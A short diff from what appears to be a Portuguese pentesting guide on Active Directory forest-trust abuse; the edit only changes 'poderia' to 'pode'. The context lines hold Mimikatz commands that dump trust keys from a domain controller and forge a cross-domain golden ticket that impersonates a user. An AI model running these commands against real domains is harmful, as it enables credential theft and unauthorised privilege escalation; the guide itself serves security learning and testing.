@@ -91,7 +91,7 @@ Se um usuário for migrado **de uma floresta para outra** e **o SID Filtering n�
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Você poderia **assinar com** a chave **confiável** um **TGT impersonando** o usuário do domínio atual.
+Você pode **assinar com** a chave **confiável** um **TGT impersonando** o usuário do domínio atual.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
